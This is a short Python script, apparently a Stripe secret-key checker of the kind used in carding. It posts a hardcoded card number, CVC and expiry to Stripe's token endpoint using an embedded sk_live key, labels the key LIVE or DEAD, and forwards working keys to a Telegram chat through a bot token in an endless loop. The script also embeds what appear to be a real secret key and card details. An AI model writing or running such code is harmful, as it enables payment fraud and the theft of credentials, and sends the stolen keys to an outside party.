import requests, \
       random,\
       string, \
       os

token = os.environ.get("BOT_TOKEN")
chatid = os.environ.get("FORWARD_ID",\
            "-1001566858781")
    
def short_key():
  skkey = "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"
  pos = requests.post(
        url="https://api.stripe.com/v1/tokens",
        headers={'Content-Type': 'application/x-www-form-urlencoded'}, 
        data={'card[number]': '5524754009741032','card[cvc]': '349','card[exp_month]': '12','card[exp_year]': '2026'}, 
        auth=(skkey, ""))

  if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
    print(f"DEAD > {skkey}")

  else:
    print(f"LIVE > {skkey}")
    requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=Nangu Got LIVE > {skkey}")

while 1:
  short_key()
